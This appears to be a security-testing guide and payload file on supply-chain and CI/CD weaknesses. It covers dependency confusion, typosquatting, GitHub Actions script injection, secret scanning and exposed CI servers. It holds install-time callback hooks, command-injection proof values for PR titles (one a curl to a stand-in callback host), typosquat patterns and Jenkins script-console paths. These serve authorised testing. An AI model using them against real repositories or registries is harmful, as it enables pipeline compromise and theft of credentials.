blocks.text: Software supply-chain and CI/CD weaknesses let an attacker run code in a build, publish or deploy pipeline without touching the production application. This category covers dependency confusion and typosquatting, malicious install scripts, GitHub Actions and other CI workflow injection, secrets in repositories and artifacts, over-permissive CI tokens and exposed build infrastructure. Pipelines often hold cloud and registry credentials, so one injection can reach production.

items: Internal package names that are unclaimed on public registries (npm, PyPI, RubyGems, Maven, NuGet)
Typosquatted or lookalike package names, and install-time scripts (`preinstall`, `postinstall`, `setup.py`)
GitHub Actions workflows that put untrusted input (issue titles, PR titles, branch names, comment bodies) into `run:` steps
`pull_request_target` and `workflow_run` workflows that check out and execute untrusted code
Self-hosted runners shared with public repositories
Secrets in commit history, build logs, artifacts, container image layers and CI variables
Unpinned third-party actions and base images; mutable tags; lockfile tampering
Exposed CI servers (Jenkins, GitLab Runner, TeamCity), unauthenticated dashboards and script consoles

blocks.text: Test only repositories and registries you own or are explicitly authorised to test. For dependency confusion, list package names from manifests and lockfiles of an in-scope target, then check whether each name is claimed publicly. Prove it with an inert package that only makes a DNS callback, never with code that reads environment or files. For Actions injection, read workflows for `${{ github.event.* }}` used inside `run:` blocks and review trigger types and permissions. Report the vulnerable pattern and a minimal proof on a fork or test repository.
See `supply-chain-ci-payloads.txt` for detection commands, vulnerable workflow patterns and inert callback packages. Use unique tokens and your own callback host.

# Supply Chain and CI/CD Payloads
# Detection commands, vulnerable patterns and inert callbacks. Use only in authorised scope with your own callback host.

# Dependency confusion: enumerate candidate internal names from manifests
grep -rhoE '"name":\s*"[^"]+"' package.json
jq -r '.dependencies,.devDependencies|keys[]' package.json
cat requirements.txt | cut -d= -f1 | cut -d'>' -f1 | cut -d'<' -f1
grep -E '^\s*(compile|implementation|api)\s' build.gradle
grep -oE '<artifactId>[^<]+' pom.xml
grep -E 'PackageReference Include' *.csproj
bundle list --name-only

# Dependency confusion: check public registry ownership of each name (404 means unclaimed)
npm view <package-name> name
curl -s -o /dev/null -w "%{http_code}\n" https://registry.npmjs.org/<package-name>
curl -s -o /dev/null -w "%{http_code}\n" https://pypi.org/pypi/<package-name>/json
curl -s -o /dev/null -w "%{http_code}\n" https://rubygems.org/api/v1/gems/<package-name>.json
curl -s -o /dev/null -w "%{http_code}\n" https://repo1.maven.org/maven2/<group-path>/<artifact>/
curl -s -o /dev/null -w "%{http_code}\n" https://api.nuget.org/v3-flatcontainer/<package-name>/index.json

# Dependency confusion: indicators of a vulnerable resolver configuration
# .npmrc without a scoped registry: registry=https://registry.npmjs.org/
# pip.conf with --extra-index-url (the highest version wins across indexes)
# pip install --extra-index-url https://internal.example.test/simple <package>
# Maven repositories declared without <mirrorOf> restrictions
# NuGet.config without packageSourceMapping

# Inert proof-of-concept package: callback on install, sends only the package name and a unique token
# npm package.json (scripts run at install)
{"name":"<unclaimed-package-name>","version":"99.0.0","scripts":{"preinstall":"node -e \"require('dns').lookup('<unique-token>.oast.example.test',function(){})\""}}
# PyPI setup.py
import socket; socket.gethostbyname('<unique-token>.oast.example.test')
# RubyGems extconf.rb
require 'resolv'; Resolv.getaddress('<unique-token>.oast.example.test') rescue nil

# Typosquat name generation patterns (check for existing registrations of lookalike names)
# transposition: lodsah / reqeusts
# omission: lodas / reuests
# repetition: lodassh / reqquests
# hyphen/underscore swap: python-dateutil / python_dateutil
# scope confusion: @example-test/core vs @exampletest/core
# prefix/suffix: py-requests / requests-py

# Install-time script locations to review in a dependency
# package.json: preinstall, install, postinstall, prepare
# setup.py: cmdclass install override, top-level code
# pyproject.toml: build-backend custom hooks
# *.gemspec: extensions
# pom.xml: exec-maven-plugin / antrun
# build.rs (Rust), CMake/Makefile hooks

# GitHub Actions: vulnerable patterns (untrusted input interpolated into a run step)
run: echo "${{ github.event.issue.title }}"
run: echo "${{ github.event.pull_request.title }}"
run: echo "${{ github.event.pull_request.body }}"
run: echo "${{ github.event.pull_request.head.ref }}"
run: echo "${{ github.head_ref }}"
run: echo "${{ github.event.comment.body }}"
run: echo "${{ github.event.review.body }}"
run: echo "${{ github.event.commits[0].message }}"
run: echo "${{ github.event.head_commit.message }}"
run: echo "${{ github.event.head_commit.author.name }}"
run: echo "${{ github.event.workflow_run.head_branch }}"
run: echo "${{ github.event.pages[0].page_name }}"

# GitHub Actions: injection proof values (put the value in an issue/PR title on a test fork; the marker prints a harmless line)
a"; echo ci-injection-marker; "
$(echo ci-injection-marker)
`echo ci-injection-marker`
"; curl -s https://<unique-token>.oast.example.test/ci; "
x" && echo ci-injection-marker && echo "

# GitHub Actions: dangerous triggers and checkouts to look for
on: pull_request_target
on: workflow_run
on: issue_comment
uses: actions/checkout@v4 with: { ref: ${{ github.event.pull_request.head.sha }} }
uses: actions/checkout@v4 with: { ref: ${{ github.event.pull_request.head.ref }} }
permissions: write-all
permissions: { contents: write, pull-requests: write, id-token: write }
secrets: inherit

# GitHub Actions: script-injection via github-script and environment files
uses: actions/github-script@v7 with: { script: "console.log('${{ github.event.issue.title }}')" }
run: echo "${{ github.event.issue.title }}" >> $GITHUB_ENV
run: echo "${{ github.event.issue.title }}" >> $GITHUB_PATH
run: echo "VAR=${{ github.event.issue.title }}" >> "$GITHUB_OUTPUT"

# GitHub Actions: unpinned third-party actions and mutable references
uses: someorg/some-action@main
uses: someorg/some-action@v1
uses: someorg/some-action@master
# prefer: uses: someorg/some-action@<40-char-commit-sha>

# GitHub Actions: cache poisoning and artifact trust (look for a privileged workflow that restores a cache or downloads an artifact produced by an untrusted one)
uses: actions/cache@v4
uses: actions/download-artifact@v4
uses: dawidd6/action-download-artifact@v3

# Self-hosted runner exposure checks
runs-on: self-hosted
runs-on: [self-hosted, linux]
# public repository + self-hosted runner + pull_request trigger = untrusted code on infrastructure

# Secrets scanning commands (own repositories)
gitleaks detect --source . --redact
trufflehog git file://. --only-verified
git log -p --all -S 'BEGIN PRIVATE KEY'
git log --all --full-history -- '*.env' '*.pem' 'id_rsa*'
docker save <image> | tar -xO | grep -aE 'AKIA[0-9A-Z]{16}'

# Container and base-image supply chain checks
FROM node:latest
FROM python
FROM ubuntu:rolling
# prefer: FROM node@sha256:<digest>

# CI server exposure checks (own infrastructure)
/script
/scriptText
/manage
/jenkins/script
/api/json
/credentials/
/asynchPeople/
/computer/
/gitlab-ci
/.github/workflows/

# Registry and lockfile integrity checks
npm audit signatures
npm ci --ignore-scripts
pip install --require-hashes -r requirements.txt
cargo vet
# review lockfile diffs for resolved URLs that point outside the expected registry
grep -E '"resolved":\s*"http' package-lock.json | grep -v registry.npmjs.org
grep -vE '^\s*#' requirements.txt | grep -E '^git\+|^https?://'
